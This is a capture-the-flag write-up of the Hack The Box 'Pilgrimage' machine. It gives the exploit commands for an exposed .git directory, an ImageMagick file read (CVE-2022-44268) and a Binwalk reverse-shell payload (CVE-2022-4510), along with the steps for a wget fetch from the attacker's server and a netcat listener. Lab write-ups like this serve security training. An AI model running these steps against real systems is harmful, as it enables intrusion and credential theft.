## Pilgrimage - Linux - Easy
### Reproduction
**Vulnerability Exploited**: Misconfiguration - Exploitation  

**System Vulnerabilities**:Kernel - Linux 5.10.0-23-amd64 - 10.10.11.219

**Vulnerabilities Explaination**: Misconfiguration lead to Arbitrary File Read (LFI) lead to RCE/ACE  

**Previlege Escalation Vulnerabilities**: Binwalk - CVE-2022-4510  

**Vulnerabilities Fix**: Update lasted version binwalk, Re-configuration information leaked.  

**Severity**: Critical

**Details**  
***Gathering&Exploitation***  
![dirsearch](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/dirsearch.PNG?raw=true)

Firstly, we using `dirsearch` tool to scan this server, we got `.git` link by misconfiguration leaked.  
From information we gathered by `dirsearch`, use `git dumper` tool dump all file from `pilgrimage.htb/.git`   
![dumping](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/git-dump.PNG?raw=true)  
After dump data from src `.git`, access `dumped` folder, read `login.php` back-end, got db name and db location use to  
get username and password login to web server `sqlite:/var/db/pilgrimage`  
![db-information](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/db-location.PNG?raw=true)  
On recently directory, we got `magick` ImageMagick 7.1.0-49 tool, got [CVE-2022-44268](https://github.com/Sybil-Scan/imagemagick-lfi-poc) Arbitrary File Read.  
use command `python3 generate.py -f "/var/db/pilgrimage" -o exploit.png`, upload exploit.png to website, shrink 
`http://pilgrimage.htb/` and download this png, using `exiftool <img.png> -b` got hex code  
![hex code](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/exiftool.PNG?raw=true)  
use [CyberChef](https://gchq.github.io/CyberChef/) to decode hext get readable data(sqlite).  
![sqli-readable-data](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/readable-message.PNG?raw=true)
use sqlitebrowser retrieving data from sqlite db file. got username and password of `emily` account.  
![ssh-account](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/user-pass.PNG?raw=true)  
Try to ssh emily@ip with password, got shell.  
***PE***  
I'm trying upload `linpeas.sh`, got some CVE but POC not work althought all of them `It work!`  
![CVE-2022-0487](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/cve%202022-0487.PNG?raw=true)  

Continues, i'm trying monitoring `pspy64` process of this machine, `oh Crap!` got a `malwarescan.sh` script running on process, read source file, they using `binwalk` while processing file upload, check version of binwalk we got `Binwalk v2.3.2` - exploitable [CVE-2022-4510](https://www.exploit-db.com/exploits/51249).   
![Binwalk-processing file](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/binwalk-read.PNG?raw=true)  
Using CVE-2022-4510, Create a payload PE `python3 51249.py your-any-images.png your-ip port`, on vulnerable machine at `/var/www/pilgrimage.htb/shrunk/`  
upload this payload on directory, i'm using python simple server to wget this payload from vulnerable machine `wget <myserver>:8000/payload.png` and netcat on payload port  
![PE-sucessfully](https://github.com/nvth/htb/blob/master/pilgrimage/imgs/root.PNG?raw=true)

Rooted!  

***Flex***  
https://www.hackthebox.com/achievement/machine/1604413/549 












